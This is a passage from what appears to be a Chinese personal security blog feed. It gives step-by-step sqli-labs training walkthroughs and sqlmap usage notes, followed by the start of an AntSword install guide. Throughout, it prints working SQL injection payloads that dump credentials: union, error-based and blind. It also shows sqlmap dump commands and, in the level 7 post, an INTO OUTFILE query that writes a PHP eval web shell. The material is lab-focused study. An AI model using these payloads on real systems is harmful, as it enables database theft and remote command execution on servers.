<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
</li>
</ol>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
</li>
<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_54-57</title>
    <url>/2022/11/19/sqli-labs_54-57/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识基本都已经学完了，从这里开始就是训练了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>就像回到了开始~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1  显示正常</span><br><span class="line">?id=1&#x27;  无错误信息，但显示不正常</span><br></pre></td></tr></table></figure>
<p>推测闭合方式为’</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 4 --+  无错误信息，但显示不正常</span><br><span class="line">?id=1&#x27;order by 3 --+  显示正常</span><br></pre></td></tr></table></figure>
<p>字段数为3</p>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenages&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;8k8nkr7hq5&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(secret_2GAF),3 from 8k8nkr7hq5 --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第55关"><a href="#第55关" class="headerlink" title="第55关"></a>第55关</h2><p>与第54关差不多，闭合方式变更为)</p>
<h2 id="第56关"><a href="#第56关" class="headerlink" title="第56关"></a>第56关</h2><p>与第54关差不多，闭合方式变更为’)</p>
<h2 id="第57关"><a href="#第57关" class="headerlink" title="第57关"></a>第57关</h2><p>与第54关差不多，闭合方式变更为”</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>限制了次数的玩法还挺刺激的hh</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_7</title>
    <url>/2022/11/08/sqli-labs_7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关耗费了我好几个小时，究其原因，是大多博客写得不清不楚，或者说自认为清楚，读者(我)却感到很迷惑。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in…. Use outfile……<br>输入?id&#x3D;1’ 显示：You have an error in your SQL syntax<br>输入?id&#x3D;1’--+  依然报错，说明注入方式不是单纯的单引号<br>输入?id&#x3D;1’’  显示正确，说明是包含了单引号的字符型注入<br>继续不断尝试…<br>最终，输入?id&#x3D;1’))--+  显示正确，注入语句构造成功<br>（说明：这种注入需要不断尝试，并积累经验）</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
<p>可得字段数为3</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由之前的提示信息Use outfile……可知，<br>这里可以利用outfile的文档来查看回显<br>（说明：</p>
</li>
</ol>
<ul>
<li>读取文档：load_file()<br>用法：select load_file(‘文件路径’)</li>
<li>导出文档：into outfile()<br>用法：select ‘string’ into outfile ‘文件路径\\文件名’<br>注意：路径要用双斜线分开）</li>
</ul>
<p><strong>但是！</strong><br>在使用文档之前必须要先获得<strong>权限</strong>。</p>
<ul>
<li>首先，打开sqli-labs使用的MySQL的my.ini。查找secure_file_priv<br>如果存在，那么修改为secure_file_priv&#x3D;””<br>否则，在[mysqld]下，新增为secure_file_priv&#x3D;””</li>
<li>然后，找到刚刚修改的MySQL的bin目录，打开管理员权限的cmd，将cmd的位置转到bin目录下，输入以下指令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">输入该数据库root用户密码</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure>
secure_file_priv 一栏的value为空，即是成功</li>
</ul>
<p>之后就能愉快地获取库名和版本号了,示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,database(),version() into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\database.txt&quot;--+</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\table.txt&quot; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\columns.txt&quot; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(username,0x23,password) from users) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\datas.txt&quot; --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>和第一种的前3步到获得修改文件权限的位置都是一样的。<br>之后是采用<strong>一句话木马</strong>的形式。<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\2.txt&quot; --+</span><br></pre></td></tr></table></figure>

<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><a href="https://blog.csdn.net/qq_33598708/article/details/124059514">sqli-labs第七关sql注入流程</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_58-65</title>
    <url>/2022/11/20/sqli-labs_58-65/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续挑战吧</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  显示报错信息</span><br></pre></td></tr></table></figure>
<p>由此闭合方式为’<br>因为只有5次机会，所以我们采用报错注入比较快</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;6ykqspiws7&#x27; limit 2,1),0x7e),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select secret_K2GB from 6ykqspiws7),0x7e),1) --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第59关"><a href="#第59关" class="headerlink" title="第59关"></a>第59关</h2><p>与第58关相比差不多，只是闭合方式没有单引号</p>
<h2 id="第60关"><a href="#第60关" class="headerlink" title="第60关"></a>第60关</h2><p>与第58关相比差不多，只是闭合方式为id&#x3D;-1”)</p>
<h2 id="第61关"><a href="#第61关" class="headerlink" title="第61关"></a>第61关</h2><p>与第58关相比差不多，只是闭合方式为id&#x3D;-1’))</p>
<h2 id="第62关"><a href="#第62关" class="headerlink" title="第62关"></a>第62关</h2><p>时间盲注，闭合方式’)</p>
<h2 id="第63关"><a href="#第63关" class="headerlink" title="第63关"></a>第63关</h2><p>时间盲注，闭合方式’</p>
<h2 id="第64关"><a href="#第64关" class="headerlink" title="第64关"></a>第64关</h2><p>时间盲注，闭合方式))</p>
<h2 id="第65关"><a href="#第65关" class="headerlink" title="第65关"></a>第65关</h2><p>时间盲注，闭合方式”)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还行</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_8</title>
    <url>/2022/11/09/sqli-labs_8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
</li>
</ol>
<ul>
<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
说明数据库名长度为8</li>
<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
</ul>
<ol start="3">
<li><p><strong>爆表</strong><br>道理是类似的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_9+10</title>
    <url>/2022/11/09/sqli-labs_9+10/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
<p>最终尝试完后可得数据库名是security</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
<p>最终尝试完后可得所需表名为users</p>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
<p>最终出现了我们所需的字段名username, password</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
<p>最终得到了所需的数据</p>
</li>
</ol>
<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/2022/11/21/sqlmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实是有些犹豫，要不要写这一篇的，因为觉得自己学得很浅显。<br>想了想，还是写下来吧。毕竟这个工具我是从一张白纸开始，如果不写笔记，说不定很快会忘记。</p>
<span id="more"></span>
<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>说明：本文以Windows10环境下的sqlmap版本为1.6.11.3为例，对sqlmap的一些基本使用进行讲解。本篇的示例以sqli-labs为主。<br>用法：python sqlmap.py [选项]</p>
<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><ul>
<li>Windows方式<br><a href="https://sqlmap.org/">官网</a><br>下载zip文件<br>我的是在Windows物理机上安装的，在cmd里执行命令时，需要在开头多输入一个python才能执行。<br>注意cmd运行时，需要将cmd的位置换到该安装目录下才可以。</li>
<li>Linux方式<br>git直接安装<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitclone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</span><br></pre></td></tr></table></figure></li>
<li>kali及PentestBox默认安装sqlmap</li>
</ul>
<h2 id="基本选项"><a href="#基本选项" class="headerlink" title="基本选项"></a>基本选项</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-h,--help  显示基本帮助信息并退出</span><br><span class="line">-hh    	显示高级帮助信息并退出</span><br><span class="line">--version  显示程序版本信息并退出</span><br><span class="line">-v			VERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第1-10关-GET型"><a href="#爆破sqli-labs的第1-10关-GET型" class="headerlink" title="爆破sqli-labs的第1-10关(GET型)"></a>爆破sqli-labs的第1-10关(GET型)</h2><p>首先来示例一下注入语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --purge   清缓存，可做可不做</span><br><span class="line">在物理机上，一般需要首先输入python，--purge是清除的意思。注意需要两个杠--</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1   判断是否存在注入点</span><br><span class="line">-u的意思是url，即在后面添加所需的url  GET注入时不仅需要url，还需要添加注入点，比如这里的?id=1  </span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1  --dbs --batch   爆破所有数据库</span><br><span class="line">--dbs的意思是database，即爆库  --batch的意思是批处理，即在sqlmap运行时出现选项的时候自动选择默认选项。</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security --tables --batch  爆破security数据库下所有的表</span><br><span class="line">-D意思是database，即在什么数据库下扫描   --tables即为爆数据表</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users --columns --batch   爆字段名</span><br><span class="line">-T意思是tables，后面跟所需扫描的表  --columns即为爆字段名</span><br><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot; -D database() -T users -C &quot;id,username,password&quot; --dump --batch   爆数据</span><br><span class="line">-C意思是columns，后面跟所需要扫描的字段名  --dump意思是转储，即显示数据</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>在执行过程中根据数据大小和注入方式等的不同，会导致扫描时间不同，耐心等待即可。如果一个扫描超出预计等待时间，通常可能哪里弄错了，关了和重新打开尝试即可。</li>
<li>扫描得到的数据通常会以表的形式显示出来</li>
<li>常用英文说明<br>boolean-based blind: 布尔盲注<br>error-based: 报错注入<br>AND&#x2F;OR time-based blind: 时间盲注<br>UNION query: 联合注入</li>
</ul>
<h2 id="爆破sqli-labs的第11-17关-POST型"><a href="#爆破sqli-labs的第11-17关-POST型" class="headerlink" title="爆破sqli-labs的第11-17关(POST型)"></a>爆破sqli-labs的第11-17关(POST型)</h2><p>首先来示例一下注入语句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; --dbs --batch   爆破所有数据库</span><br><span class="line">POST注入时在后面添加index.php, --data意思是通过POST发送参数，后面是具体需要发送的参数</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security --tables --batch   爆破security数据库下所有的表</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users --columns --batch</span><br><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; -D security -T users -C id,username,password --dump --batch</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>除了发送参数有区别，其它都没什么区别</li>
</ul>
<h2 id="爆破sqli-labs的第18关-User-Agent注入"><a href="#爆破sqli-labs的第18关-User-Agent注入" class="headerlink" title="爆破sqli-labs的第18关(User-Agent注入)"></a>爆破sqli-labs的第18关(User-Agent注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --user-agent=&quot;*&quot; --thread=10 --dbs --batch  爆破数据库</span><br><span class="line">这里不再需要在url后面添加index.php了   user-agent是用户代理，注入点在这里，因此选择这里注入  --thread=10 意思是线程数为10，表示运行快慢，太高容易被检测到，不宜高线程</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>除了发送参数有区别，其它都没什么区别，依葫芦画瓢即可</li>
</ul>
<h2 id="爆破sqli-labs的第19关-Referer注入"><a href="#爆破sqli-labs的第19关-Referer注入" class="headerlink" title="爆破sqli-labs的第19关(Referer注入)"></a>爆破sqli-labs的第19关(Referer注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --referer=&quot;*&quot; --thread=10 --dbs --batch  爆破数据库</span><br><span class="line">参数改为referer罢了，思路相同</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第20关-Cookie注入"><a href="#爆破sqli-labs的第20关-Cookie注入" class="headerlink" title="爆破sqli-labs的第20关(Cookie注入)"></a>爆破sqli-labs的第20关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --cookie=&quot;uname=admin&quot; --dbs --batch  爆破数据库</span><br><span class="line">参数改为cookie，差别不大</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第21关-Cookie注入"><a href="#爆破sqli-labs的第21关-Cookie注入" class="headerlink" title="爆破sqli-labs的第21关(Cookie注入)"></a>爆破sqli-labs的第21关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs-master/Less-18/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch  爆破数据库</span><br></pre></td></tr></table></figure>

<h2 id="爆破sqli-labs的第21关-Cookie注入-1"><a href="#爆破sqli-labs的第21关-Cookie注入-1" class="headerlink" title="爆破sqli-labs的第21关(Cookie注入)"></a>爆破sqli-labs的第21关(Cookie注入)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>第18关整半天弄不出来，也不知道什么原因，气死了。<br>所以这次就先写到17关了，以后有机会再补完。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs以及蚁剑安装</title>
    <url>/2022/11/23/upload-labs+%E8%9A%81%E5%89%91install/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>安装这个两个东西，其实还是有点麻烦的，于我而言。所以我打算记录一下。</p>
<span id="more"></span>
<h1 id="蚁剑安装"><a href="#蚁剑安装" class="headerlink" title="蚁剑安装"></a><strong>蚁剑安装</strong></h1><p>首先我们要获取蚁剑–&gt;<a href="https://www.yuque.com/antswordproject/antsword/srruro">获取蚁剑</a><br>点击里面的链接“获取加速器”<br>先自己建立一个AntSword目录并在该目录里建立antsword_project目录，然后下载自己所需的版本，解压。<br>之后再点击解压后的AntSword.exe文件，记得用<strong>管理员方式</strong>打开，初始化，选择antsword_project空目录作为蚁剑的工作目录。<br>如果之前已经有了蚁剑源代码，可以在这一步选择工作目录的时候，直接选择该目录作为工作目录。</p>
